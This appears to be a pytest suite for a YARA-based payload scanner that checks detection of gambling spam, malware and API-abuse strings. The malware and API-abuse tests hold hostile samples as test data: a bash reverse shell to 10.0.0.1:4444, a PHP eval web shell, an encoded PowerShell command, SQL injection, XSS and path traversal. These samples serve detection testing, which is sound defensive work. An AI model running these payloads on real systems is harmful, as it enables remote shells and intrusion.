"""
YARA Scanner Tests

Tests the YARAScanner engine: rule compilation from the bundled yara_rules/
directory, detection of known malicious payloads, non-detection of benign
content, metadata extraction, and scan statistics.

No external rules directory required — uses the bundled yara_rules/test_rules.yar
that ships with this repository.
"""
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "app"))

try:
    from minifw_ai.utils.yara_scanner import YARAScanner, YARAMatch
    YARA_AVAILABLE = True
except ImportError:
    YARA_AVAILABLE = False

pytestmark = pytest.mark.skipif(
    not YARA_AVAILABLE, reason="yara-python not installed"
)

# Bundled rules directory — always present in this repo
_RULES_DIR = Path(__file__).parent.parent / "yara_rules"


@pytest.fixture(scope="module")
def scanner():
    if not _RULES_DIR.exists():
        pytest.fail(f"Bundled yara_rules/ directory not found at {_RULES_DIR}")
    s = YARAScanner(rules_dir=str(_RULES_DIR))
    assert s.rules_loaded, "YARA rules failed to compile from bundled test_rules.yar"
    return s


# ---------------------------------------------------------------------------
# Rule compilation
# ---------------------------------------------------------------------------

def test_rules_load_from_bundled_dir():
    s = YARAScanner(rules_dir=str(_RULES_DIR))
    assert s.rules_loaded


def test_missing_rules_dir_raises():
    with pytest.raises(FileNotFoundError):
        s = YARAScanner(rules_dir="/nonexistent/path/yara_rules")
        s.compile_rules()


# ---------------------------------------------------------------------------
# Gambling detection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "Situs slot gacor terpercaya dengan bonus new member 100%",
    "Togel online Singapore hongkong sidney bandar togel terpercaya",
    "Live casino online Indonesia dengan permainan roulette dan blackjack",
    "judi online deposit pulsa tanpa potongan",
])
def test_gambling_payload_matches(scanner, payload):
    matches = scanner.scan_payload(payload)
    assert matches, f"Expected a match for gambling payload: {payload!r}"
    categories = {m.get_category() for m in matches}
    assert "gambling" in categories


def test_benign_payload_no_match(scanner):
    matches = scanner.scan_payload(
        "Welcome to our website. We offer professional services."
    )
    assert matches == [], "Benign payload should not match any rule"


# ---------------------------------------------------------------------------
# Malware detection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload,expected_category", [
    ("powershell -enc aGVsbG8gd29ybGQ=", "malware"),
    ('<?php eval($_POST["cmd"]); ?>', "malware"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "malware"),
])
def test_malware_payload_matches(scanner, payload, expected_category):
    matches = scanner.scan_payload(payload)
    assert matches, f"Expected malware match for: {payload!r}"
    categories = {m.get_category() for m in matches}
    assert expected_category in categories


# ---------------------------------------------------------------------------
# API abuse detection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "username=' OR 1=1-- &password=test",
    '<script>alert("XSS")</script>',
    "../../etc/passwd",
])
def test_api_abuse_payload_matches(scanner, payload):
    matches = scanner.scan_payload(payload)
    assert matches, f"Expected api_abuse match for: {payload!r}"
    categories = {m.get_category() for m in matches}
    assert "api_abuse" in categories


# ---------------------------------------------------------------------------
# Match metadata
# ---------------------------------------------------------------------------

def test_match_has_category_and_severity(scanner):
    matches = scanner.scan_payload("slot gacor")
    assert matches
    m = matches[0]
    assert isinstance(m, YARAMatch)
    assert m.get_category() != ""
    assert m.get_severity() in ("low", "medium", "high", "critical")


def test_match_to_dict_has_required_keys(scanner):
    matches = scanner.scan_payload("slot gacor")
    assert matches
    d = matches[0].to_dict()
    for key in ("rule", "namespace", "tags", "meta", "match_count", "timestamp"):
        assert key in d, f"Missing key in to_dict() output: {key!r}"


def test_high_severity_gambling_rule(scanner):
    matches = scanner.scan_payload("slot gacor")
    assert any(m.get_severity() == "high" for m in matches)


def test_critical_severity_malware_rule(scanner):
    matches = scanner.scan_payload("powershell -enc abc123")
    assert any(m.get_severity() == "critical" for m in matches)


# ---------------------------------------------------------------------------
# Scan statistics
# ---------------------------------------------------------------------------

def test_stats_total_scans_increments(scanner):
    scanner.reset_stats()
    scanner.scan_payload("slot gacor")
    scanner.scan_payload("normal traffic")
    stats = scanner.get_stats()
    assert stats["total_scans"] == 2


def test_stats_total_matches_increments_on_hit(scanner):
    scanner.reset_stats()
    scanner.scan_payload("slot gacor")          # match
    scanner.scan_payload("nothing suspicious")  # no match
    stats = scanner.get_stats()
    assert stats["total_matches"] >= 1


def test_stats_match_rate_is_float(scanner):
    scanner.reset_stats()
    scanner.scan_payload("slot gacor")
    stats = scanner.get_stats()
    assert isinstance(stats["match_rate"], float)
    assert 0.0 <= stats["match_rate"] <= 1.0


def test_get_stats_structure(scanner):
    stats = scanner.get_stats()
    for key in ("rules_loaded", "rules_dir", "total_scans", "total_matches", "match_rate"):
        assert key in stats, f"Missing key in get_stats(): {key!r}"
    assert stats["rules_loaded"] is True


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

def test_empty_payload_no_crash(scanner):
    matches = scanner.scan_payload("")
    assert isinstance(matches, list)


def test_bytes_payload_accepted(scanner):
    matches = scanner.scan_payload(b"slot gacor")
    assert matches


def test_get_match_summary_empty(scanner):
    summary = scanner.get_match_summary([])
    assert summary["total_matches"] == 0


def test_get_match_summary_with_matches(scanner):
    matches = scanner.scan_payload("slot gacor")
    assert matches
    summary = scanner.get_match_summary(matches)
    assert summary["total_matches"] == len(matches)
    assert "gambling" in summary["categories"]
